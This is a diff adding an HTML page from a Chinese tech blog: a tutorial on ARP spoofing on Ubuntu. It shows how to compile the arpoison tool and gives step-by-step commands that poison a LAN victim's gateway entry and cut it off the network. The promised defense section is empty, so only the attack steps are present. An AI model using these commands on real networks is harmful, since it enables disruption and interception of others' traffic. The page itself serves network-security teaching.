@@ -1,0 +1,208 @@
+<!DOCTYPE html>
+<!--Copyright©QingSword.COM︻☼1010D>-->
+<html lang="zh-ch">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0,minimum-scale=1.0, maximum-scale=1.0,user-scalable=no">
+	<meta name="description" content="晴刃,是一个致力推广实用计算机技术的个人博客;我们分享计算机知识;为计算机系统以及网络安全防范做出一份贡献。【专注技术 创造价值 共同进步】">
+	<meta name="keywords" content="晴刃,晴,qing,qingsword,ccna图文笔记,ubuntu,linux,ubuntu server,mysql,node.js,javascript,python,计算机技术博客">
+	<title>Linux环境下ARP攻击的实现与防范| QingSword.COM </title>
+	<link rel="shortcut icon" type="image/x-icon" href="../logo/favicon.ico">
+	<link rel="stylesheet" type="text/css" href="../css/basic.css">
+	<link rel="stylesheet" type="text/css" href="../css/text.css">
+	<!-- 代码块高亮js -->
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shCore.css"/>
+	<link type="text/css" rel="stylesheet" href="../plugins/SyntaxHighlighter/styles/shThemeRDark.css"/>
+	 <script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shCore.js"></script>
+	<script type="text/javascript" src="../plugins/SyntaxHighlighter/scripts/shBrushBash.js"></script>
+	<script type="text/javascript">
+	SyntaxHighlighter.all();
+	</script>
+</head>
+<body>
+	<!--header -->
+	<header id="nav">
+			<div class="nav-container"> 
+				<!-- 根大纲-->
+				<a href="http://www.qingsword.com" title="晴刃">
+					<h1 class="nav-logo">晴刃</h1>
+				</a>
+				<h2 class="nav-site-description desc-hidden">
+					自由、互助、分享、专注计算机技术
+				</h2>
+				<nav class="nav-links"> 
+					<!-- nav连接大纲-->
+					<h1 style="display:none;">网站导航</h1> 
+					<ul>
+						<li  class="li-hidden">
+							<a href="../index.html" title="home">
+								<span class="link-word"><img src="../logo/home.png" alt="home" class="link-img">首页</span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../web.html" title="web">
+								<span class="link-word"><img src="../logo/web.png" alt="web" class="link-img">前端<span class="word-hidden">设计</span></span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../system.html" title="system">
+								<span class="link-word"><img src="../logo/linux.png" alt="linux" class="link-img">系统<span class="word-hidden">应用</span></span>
+							</a>
+						</li>
+						<li class="li-hidden">
+							<a href="../net.html" title="net">
+								<span class="link-word"><img src="../logo/net.png" alt="net" class="link-img">网络<span class="word-hidden">技术</span></span>
+							</a>
+						</li>
+						<li>
+							<a href="../sitemap.html" title="sitemap">
+								<span class="link-word"><img src="../logo/archives.png" alt="archives" class="link-img"><span class="word-hidden">文章</span>归档</span>
+							</a>
+						</li>
+					</ul>
+				</nav>
+			</div>		
+	</header>
+	<!-- /header -->
+
+	<!-- content-->
+	<div id="content">
+		<div class="content-container">
+			<!-- 文章区 -->
+			<article class="text-container">
+				<header class="text-header">
+					<h1>Linux环境下ARP攻击的实现与防范</h1>	
+				</header><!-- /header -->
+				<section class="text-body">
+					<h2>引言</h2>
+					<p>相信很多处于局域网的朋友对ARP攻击并不陌生，在我们常用的Windows操作系统下拥有众多ARP防火墙，可以很好的阻断ARP攻击，但是如果使用的是Linux系统要怎么做才能防止ARP攻击呢？想要防御就需要先了解攻击的原理。这篇文章使用Ubuntu这个Linux发行版，实例演示Linux系统如何实施ARP攻击以及如何防范。</p>
+					<!-- 目录 -->
+					<h2>文章目录</h2>
+					<ul class="contents">	
+						 <li><a href="#linux-arp-attack-1">0×1.ARP工作原理</a></li>
+						 <li><a href="#linux-arp-attack-2">0×2.使用Gcc编译arpoison</a></li>
+						 <li><a href="#linux-arp-attack-3">0×3.Linux系统如何通过arpoison发起ARP攻击</a></li>
+						 <li><a href="#linux-arp-attack-4">0×4.Linux系统如何防范ARP攻击</a></li>
+					 </ul>
+					<!-- /目录 -->
+
+					<!-- 正文 -->
+					<h2 id="linux-arp-attack-1">0×1.ARP工作原理</h2>
+
+					<p>简单的说ARP（Address Resolution Protocol 地址解析协议）是在局域网环境中根据IP地址获取MAC地址的一个TCP/IP协议。</p>
+					<p>希望了解更多ARP工作原理的朋友可以参考一下本站这篇文章：[<a href="422.html" target="_black">[CCNA图文笔记]-2-OSI参考模型和设备的对应关系</a>]，文章中"数据链路层"那一节对交换机原理的描述，对理解ARP攻击非常有帮助。</p>
+
+					<p>另外，Windows下的ARP攻击实现与防范请参阅这篇文章：[<a href="404.html" target="_black">Windows环境下局域网ARP攻击实现与防范</a>]。</p>
+
+					<h2 id="linux-arp-attack-2">0×2.使用Gcc编译arpoison</h2>
+
+					<p>开始之前，我们需要下载下面两个工具，提供了百度网盘和官方下载两种方式，供大家选择：</p>
+
+					<p class="indent-p">
+						arpoison官方下载：[<a href="http://arpoison.net/" target="_black" rel="nofollow">arpoison</a>]<br>
+						libnet官方下载：[<a href="http://sourceforge.net/projects/libnet-dev/files/" target="_black" rel="nofollow">libnet</a>]<br>
+						arpoison-0.7百度网盘下载：[<a href="http://pan.baidu.com/s/1eQnDIzK" target="_black" rel="nofollow">arpoison-0.7</a>]<br>
+						libnet-1.1.6.tar.gz百度网盘下载：[<a href="http://pan.baidu.com/s/1xVpcM" target="_black" rel="nofollow">libnet-1.1.6.tar.gz</a>]
+					</p>
+					<p>本文发表的时候，arpoison最新版是"arpoison-0.7"；libnet最新的稳定版是"libnet-1.1.6.tar.gz"，测试版是"libnet-1.2-rc3.tar.gz"，本文演示使用的是稳定版。</p>
+					<p>arpoison提供的是一个C语言编写的源文件，需要用GCC将它编译成可执行文件，而编译它需要用到libnet库中的头文件，所以我们需要先安装libnet库：</p>
+					<pre class="brush: bash;">
+					#0.打开终端，Ubuntu系统默认集成了Gcc编译环境，如果提示找不到gcc，请先用下面的命令安装
+					www@qingsword.com:~$ sudo apt-get install gcc
+
+					#1.将上面的两个文件都下载到家目录中解压缩
+					www@qingsword.com:~$ tar -vxzf libnet-1.1.6.tar.gz
+					www@qingsword.com:~$ tar -vxzf arpoison-0.7.tar.gz
+
+					#2.进入libnet目录，编译安装
+					www@qingsword.com:~/libnet-1.1.6$ cd libnet-1.1.6/
+					www@qingsword.com:~/libnet-1.1.6$ sudo ./configure &amp;&amp; sudo make &amp;&amp; sudo make install
+
+					#安装完成后因为版本不同libnet.a可能会出现在下面两个地方之一
+					www@qingsword.com:~/libnet-1.1.6$ ls /usr/lib/libnet.a
+					ls: 无法访问/usr/lib/libnet.a: 没有那个文件或目录
+					www@qingsword.com:~/libnet-1.1.6$ ls /usr/local/lib/libnet.a 
+					/usr/local/lib/libnet.a 
+					#1.1.6这个版本是在这个目录中，记住这个目录，等下编译arpoison时需要用到
+
+
+					#3.编译arpoison，编译时需要用到libnet.a
+					www@qingsword.com:~/libnet-1.1.6$ cd ../arpoison-0.7
+					www@qingsword.com:~/arpoison-0.7$ sudo gcc arpoison.c /usr/local/lib/libnet.a -o arpoison
+
+					#4.将编译好的arpoison移动到/bin下方便启动
+					www@qingsword.com:~/arpoison-0.7$ sudo mv arpoison /bin/arpoison
+					</pre>
+
+					<h2 id="linux-arp-attack-3">0×3.Linux系统如何通过arpoison发起ARP攻击</h2>
+
+					<p>实验环境：</p>
+					<p class="indent-p">
+						攻击源（攻），系统Ubuntu，IP地址"192.168.1.241/24"<br>
+						目标（受），系统Ubuntu，IP地址"192.168.1.109/24"，MAC地址"cc:1e:19:92:09:24"；<br>
+						他们处于同一个局域网，局域网网关IP"192.168.1.1"，网关真实MAC"10:d1:77:fe:28:bc"；<br>
+						都使用有线连接（无线连接同样适用），攻击源有线连接设备号为eth0（若使用无线连接请替换为无线设备号）；
+					</p>
+					<pre class="brush: bash;">
+					#1.攻击源首先通过Ping获取目标MAC地址，有人可能会问，怎么知道有主机使用了109这个地址，在此之前可以使用nmap扫描局域网相同网段得到这些信息，nmap不是本文重点，有兴趣的朋友可以自己查找一下使用方法
+					www@qingsword.com:~$ ping 192.168.1.109
+
+					#2.不论能不能Ping通，等待几秒钟，使用下面的命令查看ARP缓存
+					#第一行我们得到了192.168.1.109对应的MAC地址cc:1e:19:92:09:24
+					#第二行是网关192.168.1.1对应的真实MAC地址10:d1:77:fe:28:bc
+					www@qingsword.com:~$ arp -a
+					(192.168.1.109) 位于 cc:1e:19:92:09:24 [ether] 在 eth0
+					(192.168.1.1) 位于 10:d1:77:fe:28:bc [ether] 在 eth0
+
+					#这个时候如果在受电脑上使用arp -a，会看到下面的内容，因为刚才攻Ping了他，所以他的ARP缓存中会出现攻的IP和对应的MAC
+					 * 第二条同样是网关的真实MAC地址（注意等下网关MAC的变化）
+					 */
+					www@qingsword.com:~$ arp -a
+					(192.168.1.241) 位于 00:ec:1f:90:2a:12 [ether] 在 eth0
+					(192.168.1.1) 位于 10:d1:77:fe:28:bc [ether] 在 eth0
+
+					#3.攻发动ARP攻击（命令无断行）
+					# -i后面接本地网络设备号，如果是无线连接替换成wlan0
+					# -d后面是目标IP
+					# -s是网关IP
+					# -t后面是目标MAC
+					# -r后面接一个你伪造的MAC地址
+					# 回车后会持续发送，直到使用"Ctrl+C"终止它，也可以在最后添加一个-n参数，指定发送多少个数据包
+					www@qingsword.com:~$ sudo arpoison -i eth0 -d 192.168.1.109 -s 192.168.1.1 -t cc:1e:19:92:09:24 -r 44:44:44:44:44:44
+
+					#此时在受机器上查看arp缓存，发现网关MAC地址被篡改成了攻伪造的地址，现在被攻击者是无法正常访问网络的
+					www@qingsword.com:~$ arp -a
+					(192.168.1.1) 位于 44:44:44:44:44:44 [ether] 在 eth0
+					</pre>
+
+					<h2 id="linux-arp-attack-4">0×4.Linux系统如何防范ARP攻击</h2>
+
+					<p></p>
+					<pre class="brush: bash;">
+					代码块
+					</pre>
+					
+						
+				<!-- /正文 -->
+
+				<footer class="text-footer">
+					<p>
+						*转载请注明来自:<a title="晴刃-自由、互助、分享、专注计算机技术。" href="http://www.qingsword.com" target="_blank">晴刃(QingSword.COM)</a>
+					</p>
+					<p>*原文连接:<a title="Linux环境下ARP攻击的实现与防范" href="http://www.qingsword.com/qing/1142.html" target="_blank">http://www.qingsword.com/qing/1142.html</a></p>
+				</footer>
+			</article>
+			<!-- /文章区 -->	
+		</div>
+	</div>
+	<!-- /content -->
+	
+	<!-- footer -->
+	<footer id="footer">
+		<div class="footer-container">
+			QingSword.COM &nbsp;<img src="../logo/by-nc-sa.png" alt="Creative Commons" title="Creative Commons">
+		</div>
+	</footer>
+	<!-- /footer -->
+</body>
+</html>
